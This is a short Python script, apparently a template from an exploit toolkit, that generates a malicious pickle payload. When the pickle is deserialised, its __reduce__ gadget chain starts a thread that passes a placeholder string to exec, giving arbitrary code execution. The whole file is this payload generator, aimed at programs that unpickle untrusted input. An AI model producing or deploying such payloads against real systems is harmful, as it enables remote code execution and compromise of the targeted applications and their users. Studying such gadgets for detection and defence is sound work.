import pickle
import threading

class CreateThread:
    def __reduce__(self):
        return threading.Thread, (None, __builtins__.exec, None, ('#{escaped}',))

class GadgetChain:
    def __reduce__(self):
        return threading.Thread.start, (CreateThread(),)

if __name__ == '__main__':
    pickled = pickle.dumps(GadgetChain(), protocol=0)
    print(repr(pickled.decode()))
